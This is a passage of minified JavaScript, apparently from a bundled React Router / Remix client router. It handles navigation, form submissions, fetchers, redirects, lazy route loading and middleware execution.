le=d||c,pe=Z&&Z.overrideNavigation,be=Z!=null&&Z.initialHydration&&L.matches&&L.matches.length>0&&!Y?L.matches:Ta(le,W,f),De=(Z&&Z.flushSync)===!0;if(be&&L.initialized&&!Ne&&QI(L.location,W)&&!(Z&&Z.submission&&Pi(Z.submission.formMethod))){Fn(W,{matches:be},{flushSync:De});return}let Ae=ei(be,le,W.pathname);if(Ae.active&&Ae.matches&&(be=Ae.matches),!be){let{error:yt,notFoundMatches:ut,route:Ze}=as(W.pathname);Fn(W,{matches:ut,loaderData:{},errors:{[Ze.id]:yt}},{flushSync:De});return}k=new AbortController;let Ce=Ql(t.history,W,k.signal,Z&&Z.submission),Re=new ex(t.unstable_getContext?await t.unstable_getContext():void 0),je;if(Z&&Z.pendingError)je=[Mo(be).route.id,{type:"error",error:Z.pendingError}];else if(Z&&Z.submission&&Pi(Z.submission.formMethod)){let yt=await Ja(Ce,W,Z.submission,be,Re,Ae.active,Z&&Z.initialHydration===!0,{replace:Z.replace,flushSync:De});if(yt.shortCircuited)return;if(yt.pendingActionResult){let[ut,Ze]=yt.pendingActionResult;if(Oi(Ze)&&gd(Ze.error)&&Ze.error.status===404){k=null,Fn(W,{matches:yt.matches,loaderData:{},errors:{[ut]:Ze.error}});return}}be=yt.matches||be,je=yt.pendingActionResult,pe=Wy(W,Z.submission),De=!1,Ae.active=!1,Ce=Ql(t.history,Ce.url,Ce.signal)}let{shortCircuited:Se,matches:Ve,loaderData:rt,errors:Tt}=await al(Ce,W,be,Re,Ae.active,pe,Z&&Z.submission,Z&&Z.fetcherSubmission,Z&&Z.replace,Z&&Z.initialHydration===!0,De,je);Se||(k=null,Fn(W,{matches:Ve||be,...hx(je),loaderData:rt,errors:Tt}))}async function Ja(H,W,Z,le,pe,be,De,Ae={}){Ws();let Ce=$I(W,Z);if(Ft({navigation:Ce},{flushSync:Ae.flushSync===!0}),be){let Se=await Nr(le,W.pathname,H.signal);if(Se.type==="aborted")return{shortCircuited:!0};if(Se.type==="error"){let Ve=Mo(Se.partialMatches).route.id;return{matches:Se.partialMatches,pendingActionResult:[Ve,{type:"error",error:Se.error}]}}else if(Se.matches)le=Se.matches;else{let{notFoundMatches:Ve,error:rt,route:Tt}=as(W.pathname);return{matches:Ve,pendingActionResult:[Tt.id,{type:"error",error:rt}]}}}let Re,je=Ju(le,W);if(!je.route.action&&!je.route.lazy)Re={type:"error",error:ir(405,{method:H.method,pathname:W.pathname,routeId:je.route.id})};else{let Se=Jl(s,o,H,le,je,De?[]:i,pe),Ve=await Bi(H,Se,pe,null);if(Re=Ve[je.route.id],!Re){for(let rt of le)if(Ve[rt.route.id]){Re=Ve[rt.route.id];break}}if(H.signal.aborted)return{shortCircuited:!0}}if(Oo(Re)){let Se;return Ae&&Ae.replace!=null?Se=Ae.replace:Se=lx(Re.response.headers.get("Location"),new URL(H.url),f)===L.location.pathname+L.location.search,await ur(H,Re,!0,{submission:Z,replace:Se}),{shortCircuited:!0}}if(Oi(Re)){let Se=Mo(le,je.route.id);return(Ae&&Ae.replace)!==!0&&(N="PUSH"),{matches:le,pendingActionResult:[Se.route.id,Re,je.route.id]}}return{matches:le,pendingActionResult:[je.route.id,Re]}}async function al(H,W,Z,le,pe,be,De,Ae,Ce,Re,je,Se){let Ve=be||Wy(W,De),rt=De||Ae||px(Ve),Tt=!P&&!Re;if(pe){if(Tt){let sn=Jn(Se);Ft({navigation:Ve,...sn!==void 0?{actionData:sn}:{}},{flushSync:je})}let Ge=await Nr(Z,W.pathname,H.signal);if(Ge.type==="aborted")return{shortCircuited:!0};if(Ge.type==="error"){let sn=Mo(Ge.partialMatches).route.id;return{matches:Ge.partialMatches,loaderData:{},errors:{[sn]:Ge.error}}}else if(Ge.matches)Z=Ge.matches;else{let{error:sn,notFoundMatches:Ti,route:ui}=as(W.pathname);return{matches:Ti,loaderData:{},errors:{[ui.id]:sn}}}}let yt=d||c,{dsMatches:ut,revalidatingFetchers:Ze}=ix(H,le,s,o,t.history,L,Z,rt,W,Re?[]:i,Re===!0,Ne,Me,ue,ae,F,yt,f,t.patchRoutesOnNavigation!=null,Se);if(we=++me,!t.dataStrategy&&!ut.some(Ge=>Ge.shouldLoad)&&Ze.length===0){let Ge=Cr();return Fn(W,{matches:Z,loaderData:{},errors:Se&&Oi(Se[1])?{[Se[0]]:Se[1].error}:null,...hx(Se),...Ge?{fetchers:new Map(L.fetchers)}:{}},{flushSync:je}),{shortCircuited:!0}}if(Tt){let Ge={};if(!pe){Ge.navigation=Ve;let sn=Jn(Se);sn!==void 0&&(Ge.actionData=sn)}Ze.length>0&&(Ge.fetchers=qc(Ze)),Ft(Ge,{flushSync:je})}Ze.forEach(Ge=>{zi(Ge.key),Ge.controller&&ee.set(Ge.key,Ge.controller)});let qi=()=>Ze.forEach(Ge=>zi(Ge.key));k&&k.signal.addEventListener("abort",qi);let{loaderResults:dn,fetcherResults:ti}=await Ks(ut,Ze,H,le);if(H.signal.aborted)return{shortCircuited:!0};k&&k.signal.removeEventListener("abort",qi),Ze.forEach(Ge=>ee.delete(Ge.key));let kn=bf(dn);if(kn)return await ur(H,kn.result,!0,{replace:Ce}),{shortCircuited:!0};if(kn=bf(ti),kn)return F.add(kn.key),await ur(H,kn.result,!0,{replace:Ce}),{shortCircuited:!0};let{loaderData:Ir,errors:Ei}=ux(L,Z,dn,Se,Ze,ti);Re&&L.errors&&(Ei={...L.errors,...Ei});let Js=Cr(),qn=Sr(we),ni=Js||qn||Ze.length>0;return{matches:Z,loaderData:Ir,errors:Ei,...ni?{fetchers:new Map(L.fetchers)}:{}}}function Jn(H){if(H&&!Oi(H[1]))return{[H[0]]:H[1].data};if(L.actionData)return Object.keys(L.actionData).length===0?null:L.actionData}function qc(H){return H.forEach(W=>{let Z=L.fetchers.get(W.key),le=Yu(void 0,Z?Z.data:void 0);L.fetchers.set(W.key,le)}),new Map(L.fetchers)}async function eo(H,W,Z,le){zi(H);let pe=(le&&le.flushSync)===!0,be=d||c,De=_0(L.location,L.matches,f,Z,W,le==null?void 0:le.relative),Ae=Ta(be,De,f),Ce=ei(Ae,be,De);if(Ce.active&&Ce.matches&&(Ae=Ce.matches),!Ae){We(H,W,ir(404,{pathname:De}),{flushSync:pe});return}let{path:Re,submission:je,error:Se}=nx(!0,De,le);if(Se){We(H,W,Se,{flushSync:pe});return}let Ve=Ju(Ae,Re),rt=new ex(t.unstable_getContext?await t.unstable_getContext():void 0),Tt=(le&&le.preventScrollReset)===!0;if(je&&Pi(je.formMethod)){await Qs(H,W,Re,Ve,Ae,rt,Ce.active,pe,Tt,je);return}ae.set(H,{routeId:W,path:Re}),await rs(H,W,Re,Ve,Ae,rt,Ce.active,pe,Tt,je)}async function Qs(H,W,Z,le,pe,be,De,Ae,Ce,Re){Ws(),ae.delete(H);function je(jt){if(!jt.route.action&&!jt.route.lazy){let Gi=ir(405,{method:Re.formMethod,pathname:Z,routeId:W});return We(H,W,Gi,{flushSync:Ae}),!0}return!1}if(!De&&je(le))return;let Se=L.fetchers.get(H);bt(H,XI(Re,Se),{flushSync:Ae});let Ve=new AbortController,rt=Ql(t.history,Z,Ve.signal,Re);if(De){let jt=await Nr(pe,Z,rt.signal,H);if(jt.type==="aborted")return;if(jt.type==="error"){We(H,W,jt.error,{flushSync:Ae});return}else if(jt.matches){if(pe=jt.matches,le=Ju(pe,Z),je(le))return}else{We(H,W,ir(404,{pathname:Z}),{flushSync:Ae});return}}ee.set(H,Ve);let Tt=me,yt=Jl(s,o,rt,pe,le,i,be),Ze=(await Bi(rt,yt,be,H))[le.route.id];if(rt.signal.aborted){ee.get(H)===Ve&&ee.delete(H);return}if(ue.has(H)){if(Oo(Ze)||Oi(Ze)){bt(H,Ea(void 0));return}}else{if(Oo(Ze))if(ee.delete(H),we>Tt){bt(H,Ea(void 0));return}else return F.add(H),bt(H,Yu(Re)),ur(rt,Ze,!1,{fetcherSubmission:Re,preventScrollReset:Ce});if(Oi(Ze)){We(H,W,Ze.error);return}}let qi=L.navigation.location||L.location,dn=Ql(t.history,qi,Ve.signal),ti=d||c,kn=L.navigation.state!=="idle"?Ta(ti,L.navigation.location,f):L.matches;tt(kn,"Didn't find any matches after fetcher action");let Ir=++me;Be.set(H,Ir);let Ei=Yu(Re,Ze.data);L.fetchers.set(H,Ei);let{dsMatches:Js,revalidatingFetchers:qn}=ix(dn,be,s,o,t.history,L,kn,Re,qi,i,!1,Ne,Me,ue,ae,F,ti,f,t.patchRoutesOnNavigation!=null,[le.route.id,Ze]);qn.filter(jt=>jt.key!==H).forEach(jt=>{let Gi=jt.key,os=L.fetchers.get(Gi),Dn=Yu(void 0,os?os.data:void 0);L.fetchers.set(Gi,Dn),zi(Gi),jt.controller&&ee.set(Gi,jt.controller)}),Ft({fetchers:new Map(L.fetchers)});let ni=()=>qn.forEach(jt=>zi(jt.key));Ve.signal.addEventListener("abort",ni);let{loaderResults:Ge,fetcherResults:sn}=await Ks(Js,qn,dn,be);if(Ve.signal.aborted)return;if(Ve.signal.removeEventListener("abort",ni),Be.delete(H),ee.delete(H),qn.forEach(jt=>ee.delete(jt.key)),L.fetchers.has(H)){let jt=Ea(Ze.data);L.fetchers.set(H,jt)}let Ti=bf(Ge);if(Ti)return ur(dn,Ti.result,!1,{preventScrollReset:Ce});if(Ti=bf(sn),Ti)return F.add(Ti.key),ur(dn,Ti.result,!1,{preventScrollReset:Ce});let{loaderData:ui,errors:kr}=ux(L,kn,Ge,void 0,qn,sn);Sr(Ir),L.navigation.state==="loading"&&Ir>we?(tt(N,"Expected pending action"),k&&k.abort(),Fn(L.navigation.location,{matches:kn,loaderData:ui,errors:kr,fetchers:new Map(L.fetchers)})):(Ft({errors:kr,loaderData:dx(L.loaderData,ui,kn,kr),fetchers:new Map(L.fetchers)}),Ne=!1)}async function rs(H,W,Z,le,pe,be,De,Ae,Ce,Re){let je=L.fetchers.get(H);bt(H,Yu(Re,je?je.data:void 0),{flushSync:Ae});let Se=new AbortController,Ve=Ql(t.history,Z,Se.signal);if(De){let Ze=await Nr(pe,Z,Ve.signal,H);if(Ze.type==="aborted")return;if(Ze.type==="error"){We(H,W,Ze.error,{flushSync:Ae});return}else if(Ze.matches)pe=Ze.matches,le=Ju(pe,Z);else{We(H,W,ir(404,{pathname:Z}),{flushSync:Ae});return}}ee.set(H,Se);let rt=me,Tt=Jl(s,o,Ve,pe,le,i,be),ut=(await Bi(Ve,Tt,be,H))[le.route.id];if(ee.get(H)===Se&&ee.delete(H),!Ve.signal.aborted){if(ue.has(H)){bt(H,Ea(void 0));return}if(Oo(ut))if(we>rt){bt(H,Ea(void 0));return}else{F.add(H),await ur(Ve,ut,!1,{preventScrollReset:Ce});return}if(Oi(ut)){We(H,W,ut.error);return}bt(H,Ea(ut.data))}}async function ur(H,W,Z,{submission:le,fetcherSubmission:pe,preventScrollReset:be,replace:De}={}){W.response.headers.has("X-Remix-Revalidate")&&(Ne=!0);let Ae=W.response.headers.get("Location");tt(Ae,"Expected a Location header on the redirect Response"),Ae=lx(Ae,new URL(H.url),f);let Ce=pd(L.location,Ae,{_isRedirect:!0});if(n){let Tt=!1;if(W.response.headers.has("X-Remix-Reload-Document"))Tt=!0;else if(bv.test(Ae)){const yt=JE(Ae,!0);Tt=yt.origin!==e.location.origin||or(yt.pathname,f)==null}if(Tt){De?e.location.replace(Ae):e.location.assign(Ae);return}}k=null;let Re=De===!0||W.response.headers.has("X-Remix-Replace")?"REPLACE":"PUSH",{formMethod:je,formAction:Se,formEncType:Ve}=L.navigation;!le&&!pe&&je&&Se&&Ve&&(le=px(L.navigation));let rt=le||pe;if(MI.has(W.response.status)&&rt&&Pi(rt.formMethod))await Zn(Re,Ce,{submission:{...rt,formAction:Ae},preventScrollReset:be||T,enableViewTransition:Z?I:void 0});else{let Tt=Wy(Ce,le);await Zn(Re,Ce,{overrideNavigation:Tt,fetcherSubmission:pe,preventScrollReset:be||T,enableViewTransition:Z?I:void 0})}}async function Bi(H,W,Z,le){let pe,be={};try{pe=await FI(p,H,W,le,Z,!1)}catch(De){return W.filter(Ae=>Ae.shouldLoad).forEach(Ae=>{be[Ae.route.id]={type:"error",error:De}}),be}if(H.signal.aborted)return be;for(let[De,Ae]of Object.entries(pe))if(KI(Ae)){let Ce=Ae.result;be[De]={type:"redirect",response:GI(Ce,H,De,W,f)}}else be[De]=await qI(Ae);return be}async function Ks(H,W,Z,le){let pe=Bi(Z,H,le,null),be=Promise.all(W.map(async Ce=>{if(Ce.matches&&Ce.match&&Ce.request&&Ce.controller){let je=(await Bi(Ce.request,Ce.matches,le,Ce.key))[Ce.match.route.id];return{[Ce.key]:je}}else return Promise.resolve({[Ce.key]:{type:"error",error:ir(404,{pathname:Ce.path})}})})),De=await pe,Ae=(await be).reduce((Ce,Re)=>Object.assign(Ce,Re),{});return{loaderResults:De,fetcherResults:Ae}}function Ws(){Ne=!0,ae.forEach((H,W)=>{ee.has(W)&&Me.add(W),zi(W)})}function bt(H,W,Z={}){L.fetchers.set(H,W),Ft({fetchers:new Map(L.fetchers)},{flushSync:(Z&&Z.flushSync)===!0})}function We(H,W,Z,le={}){let pe=Mo(L.matches,W);rn(H),Ft({errors:{[pe.route.id]:Z},fetchers:new Map(L.fetchers)},{flushSync:(le&&le.flushSync)===!0})}function Hn(H){return ge.set(H,(ge.get(H)||0)+1),ue.has(H)&&ue.delete(H),L.fetchers.get(H)||OI}function rn(H){let W=L.fetchers.get(H);ee.has(H)&&!(W&&W.state==="loading"&&Be.has(H))&&zi(H),ae.delete(H),Be.delete(H),F.delete(H),ue.delete(H),Me.delete(H),L.fetchers.delete(H)}function ol(H){let W=(ge.get(H)||0)-1;W<=0?(ge.delete(H),ue.add(H)):ge.set(H,W),Ft({fetchers:new Map(L.fetchers)})}function zi(H){let W=ee.get(H);W&&(W.abort(),ee.delete(H))}function Tr(H){for(let W of H){let Z=Hn(W),le=Ea(Z.data);L.fetchers.set(W,le)}}function Cr(){let H=[],W=!1;for(let Z of F){let le=L.fetchers.get(Z);tt(le,`Expected fetcher: ${Z}`),le.state==="loading"&&(F.delete(Z),H.push(Z),W=!0)}return Tr(H),W}function Sr(H){let W=[];for(let[Z,le]of Be)if(le<H){let pe=L.fetchers.get(Z);tt(pe,`Expected fetcher: ${Z}`),pe.state==="loading"&&(zi(Z),Be.delete(Z),W.push(Z))}return Tr(W),W.length>0}function Ai(H,W){let Z=L.blockers.get(H)||Gu;return Te.get(H)!==W&&Te.set(H,W),Z}function ss(H){L.blockers.delete(H),Te.delete(H)}function Fi(H,W){let Z=L.blockers.get(H)||Gu;tt(Z.state==="unblocked"&&W.state==="blocked"||Z.state==="blocked"&&W.state==="blocked"||Z.state==="blocked"&&W.state==="proceeding"||Z.state==="blocked"&&W.state==="unblocked"||Z.state==="proceeding"&&W.state==="unblocked",`Invalid blocker state transition: ${Z.state} -> ${W.state}`);let le=new Map(L.blockers);le.set(H,W),Ft({blockers:le})}function $s({currentLocation:H,nextLocation:W,historyAction:Z}){if(Te.size===0)return;Te.size>1&&$t(!1,"A router only supports one blocker at a time");let le=Array.from(Te.entries()),[pe,be]=le[le.length-1],De=L.blockers.get(pe);if(!(De&&De.state==="proceeding")&&be({currentLocation:H,nextLocation:W,historyAction:Z}))return pe}function as(H){let W=ir(404,{pathname:H}),Z=d||c,{matches:le,route:pe}=fx(Z);return{notFoundMatches:le,route:pe,error:W}}function to(H,W,Z){if(E=H,M=W,C=Z||null,!V&&L.navigation===Ky){V=!0;let le=Xs(L.location,L.matches);le!=null&&Ft({restoreScrollPosition:le})}return()=>{E=null,M=null,C=null}}function Hi(H,W){return C&&C(H,W.map(le=>dI(le,L.loaderData)))||H.key}function dr(H,W){if(E&&M){let Z=Hi(H,W);E[Z]=M()}}function Xs(H,W){if(E){let Z=Hi(H,W),le=E[Z];if(typeof le=="number")return le}return null}function ei(H,W,Z){if(t.patchRoutesOnNavigation)if(H){if(Object.keys(H[0].params).length>0)return{active:!0,matches:Of(W,Z,f,!0)}}else return{active:!0,matches:Of(W,Z,f,!0)||[]};return{active:!1,matches:null}}async function Nr(H,W,Z,le){if(!t.patchRoutesOnNavigation)return{type:"success",matches:H};let pe=H;for(;;){let be=d==null,De=d||c,Ae=o;try{await t.patchRoutesOnNavigation({signal:Z,path:W,matches:pe,fetcherKey:le,patch:(je,Se)=>{Z.aborted||rx(je,Se,De,Ae,s)}})}catch(je){return{type:"error",error:je,partialMatches:pe}}finally{be&&!Z.aborted&&(c=[...c])}if(Z.aborted)return{type:"aborted"};let Ce=Ta(De,W,f);if(Ce)return{type:"success",matches:Ce};let Re=Of(De,W,f,!0);if(!Re||pe.length===Re.length&&pe.every((je,Se)=>je.route.id===Re[Se].route.id))return{type:"success",matches:null};pe=Re}}function Rr(H){o={},d=Wf(H,s,void 0,o)}function Zs(H,W){let Z=d==null;rx(H,W,d||c,o,s),Z&&(c=[...c],Ft({}))}return G={get basename(){return f},get future(){return v},get state(){return L},get routes(){return c},get window(){return e},initialize:it,subscribe:xi,enableScrollRestoration:to,navigate:Er,fetch:eo,revalidate:is,createHref:H=>t.history.createHref(H),encodeLocation:H=>t.history.encodeLocation(H),getFetcher:Hn,deleteFetcher:ol,dispose:gt,getBlocker:Ai,deleteBlocker:ss,patchRoutes:Zs,_internalFetchControllers:ee,_internalSetRoutes:Rr},G}function LI(t){return t!=null&&("formData"in t&&t.formData!=null||"body"in t&&t.body!==void 0)}function _0(t,e,n,i,s,o){let c,d;if(s){c=[];for(let p of e)if(c.push(p),p.route.id===s){d=p;break}}else c=e,d=e[e.length-1];let f=Ym(i||".",Gm(c),or(t.pathname,n)||t.pathname,o==="path");if(i==null&&(f.search=t.search,f.hash=t.hash),(i==null||i===""||i===".")&&d){let p=xv(f.search);if(d.route.index&&!p)f.search=f.search?f.search.replace(/^\?/,"?index&"):"?index";else if(!d.route.index&&p){let v=new URLSearchParams(f.search),b=v.getAll("index");v.delete("index"),b.filter(E=>E).forEach(E=>v.append("index",E));let w=v.toString();f.search=w?`?${w}`:""}}return n!=="/"&&(f.pathname=f.pathname==="/"?n:Qr([n,f.pathname])),Ua(f)}function nx(t,e,n){if(!n||!LI(n))return{path:e};if(n.formMethod&&!WI(n.formMethod))return{path:e,error:ir(405,{method:n.formMethod})};let i=()=>({path:e,error:ir(400,{type:"invalid-body"})}),o=(n.formMethod||"get").toUpperCase(),c=dT(e);if(n.body!==void 0){if(n.formEncType==="text/plain"){if(!Pi(o))return i();let b=typeof n.body=="string"?n.body:n.body instanceof FormData||n.body instanceof URLSearchParams?Array.from(n.body.entries()).reduce((w,[E,C])=>`${w}${E}=${C}
`,""):String(n.body);return{path:e,submission:{formMethod:o,formAction:c,formEncType:n.formEncType,formData:void 0,json:void 0,text:b}}}else if(n.formEncType==="application/json"){if(!Pi(o))return i();try{let b=typeof n.body=="string"?JSON.parse(n.body):n.body;return{path:e,submission:{formMethod:o,formAction:c,formEncType:n.formEncType,formData:void 0,json:b,text:void 0}}}catch{return i()}}}tt(typeof FormData=="function","FormData is not available in this environment");let d,f;if(n.formData)d=x0(n.formData),f=n.formData;else if(n.body instanceof FormData)d=x0(n.body),f=n.body;else if(n.body instanceof URLSearchParams)d=n.body,f=cx(d);else if(n.body==null)d=new URLSearchParams,f=new FormData;else try{d=new URLSearchParams(n.body),f=cx(d)}catch{return i()}let p={formMethod:o,formAction:c,formEncType:n&&n.formEncType||"application/x-www-form-urlencoded",formData:f,json:void 0,text:void 0};if(Pi(p.formMethod))return{path:e,submission:p};let v=$a(e);return t&&v.search&&xv(v.search)&&d.append("index",""),v.search=`?${d}`,{path:Ua(v),submission:p}}function ix(t,e,n,i,s,o,c,d,f,p,v,b,w,E,C,M,V,B,Y,D){var P;let Q=D?Oi(D[1])?D[1].error:D[1].data:void 0,G=s.createURL(o.location),L=s.createURL(f),N;if(v&&o.errors){let Ne=Object.keys(o.errors)[0];N=c.findIndex(Me=>Me.route.id===Ne)}else if(D&&Oi(D[1])){let Ne=D[0];N=c.findIndex(Me=>Me.route.id===Ne)-1}let T=D?D[1].statusCode:void 0,k=T&&T>=400,I={currentUrl:G,currentParams:((P=o.matches[0])==null?void 0:P.params)||{},nextUrl:L,nextParams:c[0].params,...d,actionResult:Q,actionStatus:T},j=c.map((Ne,Me)=>{let{route:ee}=Ne,me=null;if(N!=null&&Me>N?me=!1:ee.lazy?me=!0:ee.loader==null?me=!1:v?me=w0(ee,o.loaderData,o.errors):VI(o.loaderData,o.matches[Me],Ne)&&(me=!0),me!==null)return b0(n,i,t,Ne,p,e,me);let we=k?!1:b||G.pathname+G.search===L.pathname+L.search||G.search!==L.search||UI(o.matches[Me],Ne),Be={...I,defaultShouldRevalidate:we},F=Zf(Ne,Be);return b0(n,i,t,Ne,p,e,F,Be)}),z=[];return C.forEach((Ne,Me)=>{if(v||!c.some(ue=>ue.route.id===Ne.routeId)||E.has(Me))return;let ee=o.fetchers.get(Me),me=ee&&ee.state!=="idle"&&ee.data===void 0,we=Ta(V,Ne.path,B);if(!we){if(Y&&me)return;z.push({key:Me,routeId:Ne.routeId,path:Ne.path,matches:null,match:null,request:null,controller:null});return}if(M.has(Me))return;let Be=Ju(we,Ne.path),F=new AbortController,ae=Ql(s,Ne.path,F.signal),ge=null;if(w.has(Me))w.delete(Me),ge=Jl(n,i,ae,we,Be,p,e);else if(me)b&&(ge=Jl(n,i,ae,we,Be,p,e));else{let ue={...I,defaultShouldRevalidate:k?!1:b};Zf(Be,ue)&&(ge=Jl(n,i,ae,we,Be,p,e,ue))}ge&&z.push({key:Me,routeId:Ne.routeId,path:Ne.path,matches:ge,match:Be,request:ae,controller:F})}),{dsMatches:j,revalidatingFetchers:z}}function w0(t,e,n){if(t.lazy)return!0;if(!t.loader)return!1;let i=e!=null&&t.id in e,s=n!=null&&n[t.id]!==void 0;return!i&&s?!1:typeof t.loader=="function"&&t.loader.hydrate===!0?!0:!i&&!s}function VI(t,e,n){let i=!e||n.route.id!==e.route.id,s=!t.hasOwnProperty(n.route.id);return i||s}function UI(t,e){let n=t.route.path;return t.pathname!==e.pathname||n!=null&&n.endsWith("*")&&t.params["*"]!==e.params["*"]}function Zf(t,e){if(t.route.shouldRevalidate){let n=t.route.shouldRevalidate(e);if(typeof n=="boolean")return n}return e.defaultShouldRevalidate}function rx(t,e,n,i,s){let o;if(t){let f=i[t];tt(f,`No route found to patch children into: routeId = ${t}`),f.children||(f.children=[]),o=f.children}else o=n;let c=e.filter(f=>!o.some(p=>aT(f,p))),d=Wf(c,s,[t||"_","patch",String((o==null?void 0:o.length)||"0")],i);o.push(...d)}function aT(t,e){return"id"in t&&"id"in e&&t.id===e.id?!0:t.index===e.index&&t.path===e.path&&t.caseSensitive===e.caseSensitive?(!t.children||t.children.length===0)&&(!e.children||e.children.length===0)?!0:t.children.every((n,i)=>{var s;return(s=e.children)==null?void 0:s.some(o=>aT(n,o))}):!1}var sx=new WeakMap,oT=({key:t,route:e,manifest:n,mapRouteProperties:i})=>{let s=n[e.id];if(tt(s,"No route found in manifest"),!s.lazy||typeof s.lazy!="object")return;let o=s.lazy[t];if(!o)return;let c=sx.get(s);c||(c={},sx.set(s,c));let d=c[t];if(d)return d;let f=(async()=>{let p=oI(t),b=s[t]!==void 0&&t!=="hasErrorBoundary";if(p)$t(!p,"Route property "+t+" is not a supported lazy route property. This property will be ignored."),c[t]=Promise.resolve();else if(b)$t(!1,`Route "${s.id}" has a static property "${t}" defined. The lazy property will be ignored.`);else{let w=await o();w!=null&&(Object.assign(s,{[t]:w}),Object.assign(s,i(s)))}typeof s.lazy=="object"&&(s.lazy[t]=void 0,Object.values(s.lazy).every(w=>w===void 0)&&(s.lazy=void 0))})();return c[t]=f,f},ax=new WeakMap;function BI(t,e,n,i,s){let o=n[t.id];if(tt(o,"No route found in manifest"),!t.lazy)return{lazyRoutePromise:void 0,lazyHandlerPromise:void 0};if(typeof t.lazy=="function"){let v=ax.get(o);if(v)return{lazyRoutePromise:v,lazyHandlerPromise:v};let b=(async()=>{tt(typeof t.lazy=="function","No lazy route function found");let w=await t.lazy(),E={};for(let C in w){let M=w[C];if(M===void 0)continue;let V=cI(C),Y=o[C]!==void 0&&C!=="hasErrorBoundary";V?$t(!V,"Route property "+C+" is not a supported property to be returned from a lazy route function. This property will be ignored."):Y?$t(!Y,`Route "${o.id}" has a static property "${C}" defined but its lazy function is also returning a value for this property. The lazy route property "${C}" will be ignored.`):E[C]=M}Object.assign(o,E),Object.assign(o,{...i(o),lazy:void 0})})();return ax.set(o,b),b.catch(()=>{}),{lazyRoutePromise:b,lazyHandlerPromise:b}}let c=Object.keys(t.lazy),d=[],f;for(let v of c){if(s&&s.includes(v))continue;let b=oT({key:v,route:t,manifest:n,mapRouteProperties:i});b&&(d.push(b),v===e&&(f=b))}let p=d.length>0?Promise.all(d).then(()=>{}):void 0;return p==null||p.catch(()=>{}),f==null||f.catch(()=>{}),{lazyRoutePromise:p,lazyHandlerPromise:f}}async function ox(t){let e=t.matches.filter(s=>s.shouldLoad),n={};return(await Promise.all(e.map(s=>s.resolve()))).forEach((s,o)=>{n[e[o].route.id]=s}),n}async function zI(t){return t.matches.some(e=>e.route.unstable_middleware)?lT(t,!1,()=>ox(t),(e,n)=>({[n]:{type:"error",result:e}})):ox(t)}async function lT(t,e,n,i){let{matches:s,request:o,params:c,context:d}=t,f={handlerResult:void 0};try{let p=s.flatMap(b=>b.route.unstable_middleware?b.route.unstable_middleware.map(w=>[b.route.id,w]):[]),v=await cT({request:o,params:c,context:d},p,e,f,n);return e?v:f.handlerResult}catch(p){if(!f.middlewareError)throw p;let v=await i(f.middlewareError.error,f.middlewareError.routeId);return f.handlerResult?Object.assign(f.handlerResult,v):v}}async function cT(t,e,n,i,s,o=0){let{request:c}=t;if(c.signal.aborted)throw c.signal.reason?c.signal.reason:new Error(`Request aborted without an \`AbortSignal.reason\`: ${c.method} ${c.url}`);let d=e[o];if(!d)return i.handlerResult=await s(),i.handlerResult;let[f,p]=d,v=!1,b,w=async()=>{if(v)throw new Error("You may only call `next()` once per middleware");v=!0,await cT(t,e,n,i,s,o+1)};try{let E=await p({request:t.request,params:t.params,context:t.context},w);return v?E===void 0?b:E:w()}catch(E){throw i.middlewareError?i.middlewareError.error!==E&&(i.middlewareError={routeId:f,error:E}):i.middlewareError={routeId:f,error:E},E}}function uT(t,e,n,i,s){let o=oT({key:"unstable_middleware",route:i.route,manifest:e,mapRouteProperties:t}),c=BI(i.route,Pi(n.method)?"action":"loader",e,t,s);return{middleware:o,route:c.lazyRoutePromise,handler:c.lazyHandlerPromise}}function b0(t,e,n,i,s,o,c,d=null){let f=!1,p=uT(t,e,n,i,s);return{...i,_lazyPromises:p,shouldLoad:c,unstable_shouldRevalidateArgs:d,unstable_shouldCallHandler(v){return f=!0,d?typeof v=="boolean"?Zf(i,{...d,defaultShouldRevalidate:v}):Zf(i,d):c},resolve(v){return f||c||v&&n.method==="GET"&&(i.route.lazy||i.route.loader)?HI({request:n,match:i,lazyHandlerPromise:p==null?void 0:p.handler,lazyRoutePromise:p==null?void 0:p.route,handlerOverride:v,scopedContext:o}):Promise.resolve({type:"data",result:void 0})}}}function Jl(t,e,n,i,s,o,c,d=null){return i.map(f=>f.route.id!==s.route.id?{...f,shouldLoad:!1,unstable_shouldRevalidateArgs:d,unstable_shouldCallHandler:()=>!1,_lazyPromises:uT(t,e,n,f,o),resolve:()=>Promise.resolve({type:"data",result:void 0})}:b0(t,e,n,f,o,c,!0,d))}async function FI(t,e,n,i,s,o){n.some(p=>{var v;return(v=p._lazyPromises)==null?void 0:v.middleware})&&await Promise.all(n.map(p=>{var v;return(v=p._lazyPromises)==null?void 0:v.middleware}));let c={request:e,params:n[0].params,context:s,matches:n},f=await t({...c,fetcherKey:i,unstable_runClientMiddleware:p=>{let v=c;return lT(v,!1,()=>p({...v,fetcherKey:i,unstable_runClientMiddleware:()=>{throw new Error("Cannot call `unstable_runClientMiddleware()` from within an `unstable_runClientMiddleware` handler")}}),(b,w)=>({[w]:{type:"error",result:b}}))}});try{await Promise.all(n.flatMap(p=>{var v,b;return[(v=p._lazyPromises)==null?void 0:v.handler,(b=p._lazyPromises)==null?void 0:b.route]}))}catch{}return f}async function HI({request:t,match:e,lazyHandlerPromise:n,lazyRoutePromise:i,handlerOverride:s,scopedContext:o}){let c,d,f=Pi(t.method),p=f?"action":"loader",v=b=>{let w,E=new Promise((V,B)=>w=B);d=()=>w(),t.signal.addEventListener("abort",d);let C=V=>typeof b!="function"?Promise.reject(new Error(`You cannot call the handler for a route which defines a boolean "${p}" [routeId: ${e.route.id}]`)):b({request:t,params:e.params,context:o},...V!==void 0?[V]:[]),M=(async()=>{try{return{type:"data",result:await(s?s(B=>C(B)):C())}}catch(V){return{type:"error",result:V}}})();return Promise.race([M,E])};try{let b=f?e.route.action:e.route.loader;if(n||i)if(b){let w,[E]=await Promise.all([v(b).catch(C=>{w=C}),n,i]);if(w!==void 0)throw w;c=E}else{await n;let w=f?e.route.action:e.route.loader;if(w)[c]=await Promise.all([v(w),i]);else if(p==="action"){let E=new URL(t.url),C=E.pathname+E.search;throw ir(405,{method:t.method,pathname:C,routeId:e.route.id})}else return{type:"data",result:void 0}}else if(b)c=await v(b);else{let w=new URL(t.url),E=w.pathname+w.search;throw ir(404,{pathname:E})}}catch(b){return{type:"error",result:b}}finally{d&&t.signal.removeEventListener("abort",d)}return c}async function qI(t){var i,s,o,c,d,f;let{result:e,type:n}=t;if(hT(e)){let p;try{let v=e.headers.get("Content-Type");v&&/\bapplication\/json\b/.test(v)?e.body==null?p=null:p=await e.json():p=await e.text()}catch(v){return{type:"error",error:v}}return n==="error"?{type:"error",error:new 